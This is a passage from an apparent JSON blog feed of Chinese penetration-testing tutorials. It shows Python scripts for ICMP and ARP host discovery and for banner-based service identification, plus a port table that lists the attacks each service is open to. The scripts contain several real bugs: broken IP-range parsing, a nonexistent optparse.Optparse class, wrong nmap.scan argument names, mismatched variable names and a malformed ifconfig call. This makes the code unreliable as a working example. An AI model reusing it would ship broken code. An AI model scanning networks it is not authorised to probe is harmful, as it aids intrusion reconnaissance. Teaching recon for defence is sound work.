class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def main():</span><br><span class=\"line\">    parser = OptionParser(&quot;Usage:%prog -i &lt;target host&gt;&quot;)   #输出帮助信息</span><br><span class=\"line\">    parser.add_option(&#x27;-i&#x27;,type=&#x27;string&#x27;,dest=&#x27;IP&#x27;,help=&#x27;specify target host&#x27;)</span><br><span class=\"line\">    #获取IP参数</span><br><span class=\"line\">    options,args = parser.parse_args()</span><br><span class=\"line\">    print(&quot;Scan report for&quot;+options.IP+&quot;\\n&quot;)</span><br><span class=\"line\">    #判断是单台主机还是多台主机</span><br><span class=\"line\">    #IP中存在-，说明是要扫描多台主机</span><br><span class=\"line\">    if &#x27;-&#x27; in options.IP:</span><br><span class=\"line\">    #代码举例：198.168.1.1-120</span><br><span class=\"line\">    #通过”-“进行分隔，把192.168.1.1和120分开</span><br><span class=\"line\">    #把192.168.1.1通过”,“进行分隔，取最后一个属作为range函数的start，然后把120+1作为range函数的stop</span><br><span class=\"line\">    #这样循环遍历出需要扫描的IP地址</span><br><span class=\"line\">        for i in range(int(options.IP.split(&#x27;-&#x27;)[0].split(&#x27;-&#x27;)[3]),int(options.IP.split(&#x27;-&#x27;)[1])+1):</span><br><span class=\"line\">            Scan(</span><br><span class=\"line\">                options.IP.split(&#x27;.&#x27;)[0]+&#x27;.&#x27; +options.IP.split(&#x27;.&#x27;)[1]+&#x27;.&#x27;+options.IP.split(&#x27;.&#x27;)[2]+&#x27;.&#x27;+str(i)</span><br><span class=\"line\">                )</span><br><span class=\"line\">            time.sleep(0.2)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        Scan(options.IP)</span><br><span class=\"line\">        </span><br><span class=\"line\">    print(&quot;\\nScan finished!...\\n&quot;)</span><br><span class=\"line\">    </span><br><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        main()</span><br><span class=\"line\">    except KeyboardInterrupt:</span><br><span class=\"line\">        print(&quot;interrupted by user,killing all threads...&quot;)</span><br></pre></td></tr></table></figure>\n<p>Scan 函数通过调用 ICMP，将构造好的请求包发送到目的地址，并根据目的地址的应答判断目标主机是否存活。存活的 IP 地址会打印出 &quot;xx.xx.xx.xx-&gt;Host<br>\nis up&quot;，对于不存活的主机打印出&quot;xx.xx.xx.xx-&gt;Host is down&quot;:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def Scan(ip):</span><br><span class=\"line\">    ip_id = randint(1,65535)</span><br><span class=\"line\">    icmp_id = randint(1,65535)</span><br><span class=\"line\">    icmp_seq = randint(1,65535)</span><br><span class=\"line\">    packet=IP(dst=ip,ttl=64,id=ip_id)/ICMP(id=icmp_id,seq=icmp_seq)/b&#x27;rootkit&#x27;</span><br><span class=\"line\">    result = sr1(packet,timeout=1,verbose=False)</span><br><span class=\"line\">    if result:</span><br><span class=\"line\">        for rcv in result:</span><br><span class=\"line\">            scan_ip = rcv[IP].src</span><br><span class=\"line\">            print(scan_ip + &#x27;---&gt;&#x27; &#x27;Host is up&#x27;)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(ip + &#x27;---&gt;&#x27; &#x27;Host is down&#x27;)</span><br></pre></td></tr></table></figure>\n<p><strong>Nmap</strong></p>\n<p>此处，也可以导入 Nmap 库函数，实现探测主机存活工具的编写。这里使用 Nmap 函数的 - sn 与 - PE 参数，-PE 表示使用 ICMP，-sn 表示只测试该主机的状态</p>\n<p>首先导入代码所应用到的模块：nmap、optparse。nmap 模块用于产生 ICMP 的请求数据包，optparse 用于生成命令行参数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import nmap</span><br><span class=\"line\">import optparse</span><br></pre></td></tr></table></figure>\n<p>接着利用 optparse 模块生成命令行参数化形式，对用户输入的参数进行接收和批量处理，最后将处理后的 IP 地址传入 NmapScan 函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    parser = optparse.Optparse(&#x27;usage:python %prog -i ip \\n\\n&#x27;)</span><br><span class=\"line\">    parser.add_option(&#x27;-i&#x27;,&#x27;--ip&#x27;,dest=&#x27;targetIP&#x27;,default=&#x27;192.168.1.1&#x27;,type=&#x27;string&#x27;,help=&#x27;target ip address&#x27;)</span><br><span class=\"line\">    options,args = parser.parse_args()</span><br><span class=\"line\">    if &#x27;-&#x27; in options.targetIP:</span><br><span class=\"line\">        for i in range(int(options.IP.split(&#x27;-&#x27;)[0].split(&#x27;-&#x27;)[3]), int(options.IP.split(&#x27;-&#x27;)[1]) + 1):</span><br><span class=\"line\">            NmapScan(</span><br><span class=\"line\">                options.IP.split(&#x27;.&#x27;)[0] + &#x27;.&#x27; + options.IP.split(&#x27;.&#x27;)[1] + &#x27;.&#x27; + options.IP.split(&#x27;.&#x27;)[2] + &#x27;.&#x27; + str(i)</span><br><span class=\"line\">            )</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        NmapScan(options.IP)</span><br></pre></td></tr></table></figure>\n<p>接下来就是处理 NmapScan 这个扫描判断函数了，因为要传入 - sn<br>\n-PE 参数，所以需要通过调用 nm.scan () 函数来实现，发起 ping 扫描，并打印出扫描之后的结果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def NmapScan(targetIP):</span><br><span class=\"line\">    #实例化PortScanner对象</span><br><span class=\"line\">    nm = nmap.PortScanner()</span><br><span class=\"line\">    try:</span><br><span class=\"line\">#hosts为目标IP地址，arguments为Nmap的扫描参数</span><br><span class=\"line\">#-sn：使用ping进行扫描</span><br><span class=\"line\">#-PE：使用ICMP的echo请求包（-pp：使用timestamp请求包 -PM：netmask请求包）</span><br><span class=\"line\">        result = nm.scan(host=targetIP,argument=&#x27;-sn -PE&#x27;)</span><br><span class=\"line\">#对结果进行切片，提取主机状态信息</span><br><span class=\"line\">        state = result[&#x27;scan&#x27;][targetIP][&#x27;status&#x27;][&#x27;state&#x27;]</span><br><span class=\"line\">        print(&quot;[&#123;&#125;] is [&#123;&#125;]&quot;.format(targetIP,state))</span><br><span class=\"line\">    except Exception as e:</span><br><span class=\"line\">        pass</span><br></pre></td></tr></table></figure>\n<p>最后，基于 ICMP 协议的主机探测、判断主机存活是一种很常见的方法，无论是以太网还是互联网都能使用。因此，当网络设备，如路由器、防火墙之类的对 ICMP 采取了限制策略，那就会影响到扫描结果，导致结果不准确。<br>\nNmap 模块实现的大体上的流程与使用 Scapy 差不多，相当于是把接受用户参数调用了 optparse 模块来实现，然后同样的遍历传入 NmapScan，再在 NmapScan 函数里面调用一个 nm.scan () 函数来传入 - sn<br>\n-PE 参数，就可以实现 ICMP 协议的实现和主机状态的探测功能</p>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8EARP%E7%9A%84%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/",
            "url": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8EARP%E7%9A%84%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/",
            "title": "主动信息收集------基于ARP的主机发现",
            "date_published": "2024-04-16T05:58:19.066Z",
            "content_html": "<blockquote>\n<p>ARP 协议（地址解析协议）属于数据链路层的协议，主要负责根据网络层地址（IP）来获取数据链路层地址（MAC）<br>\n以太网协议规定，同一局域网中的一台主机要和另一台主机进行直接通信，必须知道目标主机的 MAC 地址。而在 TCP/IP 中，网络层只关注目标主机的 IP 地址。这就导致在以太网中使用 IP 协议时，数据链路层的以太网协议接收到的网络层 IP 协议提供的数据中，只包含目标主机的 IP 地址。于是需要 ARP 协议来完成 IP 地址到 MAC 地址的转换</p>\n</blockquote>\n<p>这里假设一个以太网的结构图，如下图所示</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/W62zPRJlNsUdVncU.png!thumbnail\" alt=\"\"></p>\n<p>在这里假设 PC1 想和 PC3 进行通信，且知道了 PC3 的 IP 地址为 192.168.1.3，但是根据网络层的 IP 无法进行通信，根据以太网的协议规定，两台主机想要进行直接通信必须知道对方的 MAC 地址</p>\n<p>步骤如下：</p>\n<p>1.PC1 会检查自己的 ARP 缓存表中该 IP 是否有对应的 MAC 地址，若有可以直接进行通信</p>\n<p>2. 若无则 PC1 就会使用以太网广播包来给网络上的每一台主机发送 ARP 请求，询问 192.168.1.3 的 MAC 地址，同时 ARP 请求中也包含了 PC1 自己的 IP 地址和 MAC 地址，以太网内的所有主机都会接收到 ARP 请求，并检查是否与自己的 IP 地址相符合。如果不符合则丢弃该 ARP 请求</p>\n<p>3.PC3 确定 ARP 请求中的 IP 与自己的 IP 相符合后，就将 ARP 请求中的 PC1 的 IP 地址与 MAC 地址添加到本地的 ARP 缓存中</p>\n<p>4.PC3 将自己的 MAC 地址发送给 PC1</p>\n<p>5.PC1 收到 PC3 的 ARP 相应，将 PC3 的 IP 地址和 MAC 地址都更新到本地的 ARP 缓存中</p>\n<p>这样就可以进行直接通信了，用一个通俗点的方式来概括说明一下就是：</p>\n<blockquote>\n<p>你（PC1）知道了网友（PC3）的网名或者是 QQ 号（IP 地址），你们打算参加一个网友见面会来面基，在这个活动上你就拿着该网名（IP 地址）去挨个询问（发送 ARP 请求）参加的网友，看看谁是你想要面基的人，不认识的人就否认你的询问，直到问道了网友（PC3），他按照自己的网名知道了自己就是你想寻找的那个人，于是他就把你的网名和名字（MAC 地址）都对应记了下来，并且告诉你了他的名字，你也记下了他的名字，更新了备注<br>\n本地 ARP 缓存表是有生存周期的，生存周期结束后，就会再重复上面的过程</p>\n</blockquote>\n<p>当目标主机与我们共同处于一个以太网时，利用 ARP 进行主机发现是一个最好的选择，这种方式快且精准。同样的我们借助 Scapy 来编写 ARP 主机发现的脚本：</p>\n<blockquote>\n<p>通过脚本对以太网内的每个主机都进行 ARP 请求。若主机存活，则会响应我们的 ARP 请求，否则不会响应。因为 ARP 涉及到网络层和数据链路层，因此需要用到 Scapy 中的 Ether 和 ARP<br>\n 库中的 Eher 和 ARP 参数如下所示</p>\n</blockquote>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1IqnAJbXyaBYkwzW.png!thumbnail\" alt=\"\"></p>\n<p>Ether 中的 dst 代表目标 MAC 地址，src 代表源 MAC 地址。ARP 中的 op 代表消息类型，1 为 ARP 请求，2 为 ARP 响应，hwsrc 和 psrc 分别代表源 MAC 地址和源 ip 地址，hwdst 和 pdst 分别代表的是目标 MAC 地址和目标 ip 地址</p>\n<p>导入模块</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">import re</span><br><span class=\"line\">import optparse</span><br><span class=\"line\">from scapy.all import *</span><br></pre></td></tr></table></figure>\n<p>编写本机 IP 地址和 MAC 地址获取函数，通过正则表达式来进行获取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 取IP地址和MAC地址函数</span><br><span class=\"line\">def HostAddress(iface):</span><br><span class=\"line\">    # os.open执行后返回执行结果</span><br><span class=\"line\">    ipData = os.popen(&#x27;ifconfig&#x27; + iface)</span><br><span class=\"line\">    # 对ipData进行类型转换，再用正则进行匹配</span><br><span class=\"line\">    dataLine = ipData.readlines()</span><br><span class=\"line\">    # re.search利用正则匹配返回第一个成功匹配的结果，存在结果则为true</span><br><span class=\"line\">    # 取MAC地址</span><br><span class=\"line\">    if re.search(&#x27;\\w\\w:\\w\\w:\\w\\w:\\w\\w:\\w\\w:\\w\\w&#x27;, str(dataline)):</span><br><span class=\"line\">        # 取出匹配结果</span><br><span class=\"line\">        MAC = re.search(&#x27;\\w\\w:\\w\\w:\\w\\w:\\w\\w:\\w\\w:\\w\\w&#x27;, str(dataLine)).group(0)</span><br><span class=\"line\">    # 取ip地址</span><br><span class=\"line\">    if re.search(r&#x27;((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.)&#123;3&#125;(2[0-4]\\d|25[0-5]|[01]?\\d\\d)&#x27;, str(dataLine)):</span><br><span class=\"line\">        IP = re.search(r&#x27;((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.)&#123;3&#125;(2[0-4]\\d|25[0-5]|[01]?\\d\\d)&#x27;, str(dataLine)).group(0)</span><br><span class=\"line\">    # 将IP和MAC通过元组的形式返回</span><br><span class=\"line\">    addressInfo = (IP, MAC)</span><br><span class=\"line\">    return addressInfo</span><br></pre></td></tr></table></figure>\n<p>接着编写 ARP 探测函数，根据本机的 IP 地址和 MAC 地址信息，自动生成目标进行探测并把结果写入文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#ARP扫描函数</span><br><span class=\"line\">def ArpScan(iface=&#x27;eth0&#x27;):</span><br><span class=\"line\">    #通过HostAddress返回的元组取出MAC地址</span><br><span class=\"line\">    mac = HostAddress(iface)[1]</span><br><span class=\"line\">    #取出本机IP地址</span><br><span class=\"line\">    ip = HostAddress(iface)[0]</span><br><span class=\"line\">    #对本机IP地址进行分隔并作为一句元素，用于生成需要扫描的IP地址</span><br><span class=\"line\">    ipSplit = ip.split(&#x27;.&#x27;)</span><br><span class=\"line\">    #需要扫描的IP地址列表</span><br><span class=\"line\">    ipList = []</span><br><span class=\"line\">    #根据本机IP生成IP扫描范围</span><br><span class=\"line\">    for i in range(1,255):</span><br><span class=\"line\">        ipItem = ipSplit[0] + &#x27;.&#x27; + ipSplit[1] + &#x27;.&#x27; + ipSplit[2] + &#x27;.&#x27; + str(i)</span><br><span class=\"line\">        ipList.append(ipItem)</span><br><span class=\"line\">    &#x27;&#x27;&#x27;</span><br><span class=\"line\">    发送ARP包</span><br><span class=\"line\">    因为要用到OSI的二层和三层，所以要写成Rther/ARP</span><br><span class=\"line\">    因为最底层用到了二层，所以要用srp()发包</span><br><span class=\"line\">    &#x27;&#x27;&#x27;</span><br><span class=\"line\">    result = srp(Ether(src=mac,dst=&#x27;FF:FF:FF:FF:FF:FF&#x27;)/ARP(op=1,hwsrc=mac,hwdst=&#x27;00:00:00:00:00:00&#x27;,pdst=ipList),iface=iface,timeout=2,verbose=False)</span><br><span class=\"line\">    #读取result中的应答包和应答包内容</span><br><span class=\"line\">    resultAns = result[0].res</span><br><span class=\"line\">    #存活主机列表</span><br><span class=\"line\">    liveHost = []</span><br><span class=\"line\">    #number 为接收到应答包的总数</span><br><span class=\"line\">    number = len(resultAns)</span><br><span class=\"line\">    print(&quot;=========================&quot;)</span><br><span class=\"line\">    print(&quot;ARP探测结果&quot;)</span><br><span class=\"line\">    print(&quot;本机ip地址：&quot;+ip)</span><br><span class=\"line\">    print(&quot;本机mac地址：&quot;+mac)</span><br><span class=\"line\">    print(&quot;=========================&quot;)</span><br><span class=\"line\">    for x in range(number):</span><br><span class=\"line\">        IP = resultAns[x][1][1].fields[&#x27;psrc&#x27;]</span><br><span class=\"line\">        MAC = resultAns[x][1][1].fields[&#x27;hwsrc&#x27;]</span><br><span class=\"line\">        liveHost.append([IP,MAC])</span><br><span class=\"line\">        print(&quot;IP:&quot;+IP+&quot;\\n\\n&quot;+&quot;MAC:&quot;+MAC)</span><br><span class=\"line\">        print(&quot;============================&quot;)</span><br><span class=\"line\">    #把存活主机IP写入文件</span><br><span class=\"line\">    resultFile = open(&quot;result&quot;,&quot;w&quot;)</span><br><span class=\"line\">    for i in range(len(liveHost)):</span><br><span class=\"line\">        resultFile.write(liveHost[i][0]+&quot;\\n&quot;)</span><br><span class=\"line\">    resultFile.close()</span><br></pre></td></tr></table></figure>\n<p>编写 main 函数，利用 optparse 模块生成命令行参数化形式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    parser = optparse.OptionParser(&#x27;usage:python %prog -i interfaces \\n\\n&#x27;&#x27;Example:python %prog -i eth0\\n&#x27;)</span><br><span class=\"line\">    #添加网卡参数</span><br><span class=\"line\">    parser.add_option(&#x27;-i&#x27;,&#x27;--iface&#x27;,dest = &#x27;iface&#x27;,default=&#x27;eth0&#x27;,type=&#x27;string&#x27;,help=&#x27;interfaces name&#x27;)</span><br><span class=\"line\">    (options,args) = parser.parse_args()</span><br><span class=\"line\">    ArpScan(options.iface)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>提示：普通用户运行时需要 sudo，不然会出现 Operation not permitted 的提醒</p>\n</blockquote>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB/",
            "url": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB/",
            "title": "主动信息收集------服务识别",
            "date_published": "2024-04-16T05:58:19.064Z",
            "content_html": "<blockquote>\n<p>在渗透测试的过程中，服务识别是一个很重要的环节，如果能识别出目标主机的服务、版本等信息，对于渗透测试将有重要帮助。对于入侵者来说，发现这些运行在目标上的服务，就可以利用这些软件上的漏洞入侵目标；对于网络安全的维护者来说，也可以提前发现系统的漏洞，从而预防这些入侵行为<br>\n很多的扫描工具都是采用了一种十分简单的方式，就是根据端口号来判断服务的类型，因为通常很多常见的服务都会运行在固定的端口上，如下表</p>\n</blockquote>\n<p>端口号     说明                   作用</p>\n<hr>\n<p>21/22/69   FTP/TFTP               允许匿名上传、下载、破解和嗅探攻击<br>\n 2049       NFS 服务                配置不当<br>\n 139        Samba 服务              破解、未授权访问、远程代码执行<br>\n 389        LDAP（目录访问协议）   注入、允许匿名访问、使用弱口令</p>\n<p>文件共享服务端口</p>\n<p>端口号   说明              作用</p>\n<hr>\n<p>22       SSH 远程连接       破解、SSH 隧道以及内网代理转发，文件传输<br>\n 23       Telnet 远程连接    破解、嗅探、弱口令<br>\n 3389     Rdp 远程桌面连接   Shift 后门（需要 Windows Server 2003 以下的系统）、破解<br>\n 5900     VNC               弱口令破解<br>\n 5632     PyAnywhere        抓密码、代码执行</p>\n<p>远程连接服务端口</p>\n<p>端口号        说明                        作用</p>\n<hr>\n<p>80/443/8080   常见 Web 服务端口             Web 攻击、破解、服务器版本漏洞<br>\n 7001/7002     WebLogic 控制台              Java 反序列化、弱口令<br>\n 8080/8089     Jboss/Resin/Jetty/JenKins   反序列化、控制台弱口令<br>\n 9090          WebSphere 控制台             Java 反序列化、弱口令<br>\n 4848          GlassFish 控制台             弱口令<br>\n 1352          Lotus Domino 邮件服务        弱口令、信息泄露、破解<br>\n 10000         Webmin-Web 控制面板          弱口令</p>\n<p>Web 应用服务端口</p>\n<p>端口号        说明               作用</p>\n<hr>\n<p>3306          MySOL              注入、提权、破解<br>\n 1433          MSSQL              注入、提权、SA 弱口令、破解<br>\n 1521          Oracle 数据库       TNS 破解、注入、反弹 shell<br>\n5432          PostgreSQL 数据库   破解、注入、弱口令<br>\n 27017/27018   MongoDB            破解、未授权访问<br>\n 6379          Redis 数据库        可尝试未授权访问、弱口令破解<br>\n 5000          SysBase/DB2        破解、注入</p>\n<p>数据库服务端口</p>\n<p>端口号   说明           作用</p>\n<hr>\n<p>25       SMTP 邮件服务   邮件伪造<br>\n 110      POP3 协议       破解、嗅探<br>\n 143      IMAP 协议       破解、收集目标内网信息</p>\n<p>邮件服务端口</p>\n<p>端口号   说明          作用</p>\n<hr>\n<p>53       DNS 域名系统   允许区域传送、DNS 劫持、缓存投毒、欺骗<br>\n 67/68    DHCP 服务      劫持、欺骗<br>\n 161      SNMP 协议      破解、搜集目标内网信息</p>\n<p>网络常见协议端口</p>\n<p>端口号        说明                     作用</p>\n<hr>\n<p>2181          Zookeeper 服务            未授权访问<br>\n 8096          Zabbix 服务               远程执行、SQL 注入<br>\n 9200/9300     Elasticsearch            远程执行<br>\n 11211         Memcache                 未授权访问<br>\n 512/513/514   Linux Rexec 服务          破解、Rlogin 登录<br>\n 873           Rsync 服务                匿名访问、文件上传<br>\n 3690          SVN 服务                  SVN 泄露、未授权访问<br>\n 50000         SAP Management Console   远程执行</p>\n<p>特殊服务端口</p>\n<p>而对端口的服务进行探测的方法就是向目标开放的端口发送探针数据包，根据目标主机返回的 banner 信息与已经存储总结的 banner 信息进行对比，进而确认服务类型。而强大的 Nmap 也是利用了这种方法，它有一个十分强大的 banner 库，这个库也还在不断的完善当中</p>\n<p>根据这个特性与方法，就可以来编写扫描端口服务类型的程序了</p>\n<p>先导入所需要用到的模块，time 用于模块主要用于产生延迟时间，optparse 模块用于生成命令行参数，socket 模块用于产生 TCP 请求，re 模块为正则表达式模块，与指纹信息进行有效匹配，进而确定服务类型。SIGNS 为指纹库用于对目标主机返回的 banner 信息进行匹配，读者可自行添加扩展</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from optparse import OptionParser</span><br><span class=\"line\">import time</span><br><span class=\"line\">import socket</span><br><span class=\"line\">import re</span><br><span class=\"line\"></span><br><span class=\"line\">SIGNS = (</span><br><span class=\"line\">    #协议|版本|关键字</span><br><span class=\"line\">    b&#x27;FTP|FTP|^220.*FTP&#x27;,</span><br><span class=\"line\">    b&#x27;MySQL|MySQL|mysql_native_password&#x27;,</span><br><span class=\"line\">    b&#x27;oracle-https|^220- ora&#x27;,</span><br><span class=\"line\">    b&#x27;Telnet|Telnet|Telnet&#x27;,</span><br><span class=\"line\">    b&#x27;Telnet|Telnet|^\\r\\n%connection closed by remote host!\\x00$&#x27;,</span><br><span class=\"line\">    b&#x27;VNC|VNC|^RFB&#x27;,</span><br><span class=\"line\">    b&#x27;IMAP|IMAP|^\\* OK.*?IMAP&#x27;,</span><br><span class=\"line\">    b&#x27;POP|POP|^\\+OK.*?&#x27;,</span><br><span class=\"line\">    b&#x27;SMTP|SMTP|^220.*?SMTP&#x27;,</span><br><span class=\"line\">    b&#x27;Kangle|Kangle|HTTP.*kangle&#x27;,</span><br><span class=\"line\">    b&#x27;SMTP|SMTP|^554 SMTP&#x27;,</span><br><span class=\"line\">    b&#x27;SSH|SSH|^SSH-&#x27;,</span><br><span class=\"line\">    b&#x27;HTTPS|HTTPS|Location:https&#x27;,</span><br><span class=\"line\">    b&#x27;HTTP|HTTP|HTTP/1.1&#x27;,</span><br><span class=\"line\">    b&#x27;HTTP|HTTP|HTTP/1.0&#x27;,</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<p>接着利用 optparse 模块生成命令行参数化形式，对用户输入的参数进行接收和批量的处理，最后将处理后的 IP 地址及端口 port 传入 request () 函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def main():</span><br><span class=\"line\">    parser = OptionParser(&quot;Usage:%prog -i &lt;target host&gt;&quot;)#输出帮助信息</span><br><span class=\"line\">    parser.add_option(&#x27;-i&#x27;,type=&#x27;string&#x27;,dest=&#x27;IP&#x27;,help=&#x27;specify target host&#x27;)</span><br><span class=\"line\">    #获取IP地址参数</span><br><span class=\"line\">    parser.add_option(&#x27;-p&#x27;,type=&#x27;string&#x27;,dest=&#x27;PORT&#x27;,help=&#x27;specify target host&#x27;)</span><br><span class=\"line\">    #获取端口参数</span><br><span class=\"line\">    options,args = parser.parse_args()</span><br><span class=\"line\">    ip = options.IP</span><br><span class=\"line\">    port = options.PORT</span><br><span class=\"line\">    print(&quot;Scan report for &quot;+ip+&quot;\\n&quot;)</span><br><span class=\"line\">    for line in port.split(&#x27;,&#x27;):</span><br><span class=\"line\">        request(ip,line)</span><br><span class=\"line\">        time.sleep(0.2)</span><br><span class=\"line\">    print(&quot;\\nScan finished!...\\n&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        main()</span><br><span class=\"line\">    except 